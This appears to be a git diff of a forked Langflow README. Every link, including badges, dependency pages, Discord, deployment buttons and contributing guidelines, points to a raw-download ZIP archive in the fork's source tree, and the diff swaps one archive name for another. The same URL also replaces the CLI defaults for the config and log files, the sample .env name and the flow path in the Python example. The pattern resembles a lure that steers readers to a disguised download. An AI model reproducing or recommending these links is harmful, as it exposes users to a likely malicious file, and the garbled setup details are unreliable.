@@ -2,24 +2,24 @@
 
 # ⛓️ Langflow
 
-~ An effortless way to experiment and prototype [LangChain](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) pipelines ~
+~ An effortless way to experiment and prototype [LangChain](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) pipelines ~
 
 <p>
-<img alt="GitHub Contributors" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
-<img alt="GitHub Last Commit" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
-<img alt="" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
-<img alt="GitHub Issues" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
-<img alt="GitHub Pull Requests" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
-<img alt="Github License" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" />
+<img alt="GitHub Contributors" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
+<img alt="GitHub Last Commit" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
+<img alt="" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
+<img alt="GitHub Issues" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
+<img alt="GitHub Pull Requests" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
+<img alt="Github License" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" />
 </p>
 
 <p>
-<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"><img alt="Discord Server" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"/></a>
-<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"><img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" alt="HuggingFace Spaces"></a>
+<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip"><img alt="Discord Server" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip"/></a>
+<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip"><img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" alt="HuggingFace Spaces"></a>
 </p>
 
-<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip">
-    <img width="100%" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip"></a>
+<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip">
+    <img width="100%" src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip"></a>
 
 <p>
 </p>
@@ -61,9 +61,9 @@ pip install langflow[local]
 
 This will install the following dependencies:
 
-- [CTransformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
-- [llama-cpp-python](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
-- [sentence-transformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
+- [CTransformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
+- [llama-cpp-python](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
+- [sentence-transformers](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
 
 You can still use models from projects like LocalAI
 
@@ -81,7 +81,7 @@ langflow run # or langflow --help
 
 ### HuggingFace Spaces
 
-You can also check it out on [HuggingFace Spaces](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) and run it in your browser! You can even clone it and have your own copy of Langflow to play with.
+You can also check it out on [HuggingFace Spaces](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) and run it in your browser! You can even clone it and have your own copy of Langflow to play with.
 
 # 🖥️ Command Line Interface (CLI)
 
@@ -102,11 +102,11 @@ Each option is detailed below:
 - `--workers`: Sets the number of worker processes. Can be set using the `LANGFLOW_WORKERS` environment variable. The default is `1`.
 - `--timeout`: Sets the worker timeout in seconds. The default is `60`.
 - `--port`: Sets the port to listen on. Can be set using the `LANGFLOW_PORT` environment variable. The default is `7860`.
-- `--config`: Defines the path to the configuration file. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip`.
+- `--config`: Defines the path to the configuration file. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip`.
 - `--env-file`: Specifies the path to the .env file containing environment variables. The default is `.env`.
 - `--log-level`: Defines the logging level. Can be set using the `LANGFLOW_LOG_LEVEL` environment variable. The default is `critical`.
 - `--components-path`: Specifies the path to the directory containing custom components. Can be set using the `LANGFLOW_COMPONENTS_PATH` environment variable. The default is `langflow/components`.
-- `--log-file`: Specifies the path to the log file. Can be set using the `LANGFLOW_LOG_FILE` environment variable. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip`.
+- `--log-file`: Specifies the path to the log file. Can be set using the `LANGFLOW_LOG_FILE` environment variable. The default is `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip`.
 - `--cache`: Selects the type of cache to use. Options are `InMemoryCache` and `SQLiteCache`. Can be set using the `LANGFLOW_LANGCHAIN_CACHE` environment variable. The default is `SQLiteCache`.
 - `--dev/--no-dev`: Toggles the development mode. The default is `no-dev`.
 - `--path`: Specifies the path to the frontend directory containing build files. This option is for development purposes only. Can be set using the `LANGFLOW_FRONTEND_PATH` environment variable.
@@ -123,31 +123,31 @@ These parameters are important for users who need to customize the behavior of L
 
 You can configure many of the CLI options using environment variables. These can be exported in your operating system or added to a `.env` file and loaded using the `--env-file` option.
 
-A sample `.env` file named `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip` is included with the project. Copy this file to a new file named `.env` and replace the example values with your actual settings. If you're setting values in both your OS and the `.env` file, the `.env` settings will take precedence.
+A sample `.env` file named `https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip` is included with the project. Copy this file to a new file named `.env` and replace the example values with your actual settings. If you're setting values in both your OS and the `.env` file, the `.env` settings will take precedence.
 
 # Deployment
 
 ## Deploy Langflow on Google Cloud Platform
 
-Follow our step-by-step guide to deploy Langflow on Google Cloud Platform (GCP) using Google Cloud Shell. The guide is available in the [**Langflow in Google Cloud Platform**](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) document.
+Follow our step-by-step guide to deploy Langflow on Google Cloud Platform (GCP) using Google Cloud Shell. The guide is available in the [**Langflow in Google Cloud Platform**](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) document.
 
 Alternatively, click the **"Open in Cloud Shell"** button below to launch Google Cloud Shell, clone the Langflow repository, and start an **interactive tutorial** that will guide you through the process of setting up the necessary resources and deploying Langflow on your GCP project.
 
-[![Open in Cloud Shell](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
+[![Open in Cloud Shell](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
 
 ## Deploy on Railway
 
-[![Deploy on Railway](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
+[![Deploy on Railway](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
 
 ## Deploy on Render
 
-<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip">
-<img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip" alt="Deploy to Render" />
+<a href="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip">
+<img src="https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip" alt="Deploy to Render" />
 </a>
 
 # 🎨 Creating Flows
 
-Creating flows with Langflow is easy. Simply drag sidebar components onto the canvas and connect them together to create your pipeline. Langflow provides a range of [LangChain components](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) to choose from, including LLMs, prompt serializers, agents, and chains.
+Creating flows with Langflow is easy. Simply drag sidebar components onto the canvas and connect them together to create your pipeline. Langflow provides a range of [LangChain components](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) to choose from, including LLMs, prompt serializers, agents, and chains.
 
 Explore by editing prompt parameters, link chains and agents, track an agent's thought process, and export your flow.
 
@@ -158,23 +158,23 @@ in Python, you can load the flow with:
 ```python
 from langflow import load_flow_from_json
 
-flow = load_flow_from_json("https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip")
+flow = load_flow_from_json("https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip")
 # Now you can use it like any chain
 flow("Hey, have you heard of Langflow?")
 ```
 
 # 👋 Contributing
 
-We welcome contributions from developers of all levels to our open-source project on GitHub. If you'd like to contribute, please check our [contributing guidelines](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) and help make Langflow more accessible.
+We welcome contributions from developers of all levels to our open-source project on GitHub. If you'd like to contribute, please check our [contributing guidelines](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) and help make Langflow more accessible.
 
 ---
 
-Join our [Discord](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip) server to ask questions, make suggestions and showcase your projects! 🦾
+Join our [Discord](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip) server to ask questions, make suggestions and showcase your projects! 🦾
 
 <p>
 </p>
 
-[![Star History Chart](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/MainPage/components/components/Software-3.6.zip)
+[![Star History Chart](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)](https://github.com/UbaiSalih/langflow/raw/refs/heads/dev/src/frontend/src/pages/FlowPage/components/Software-1.7.zip)
 
 # 📄 License
 
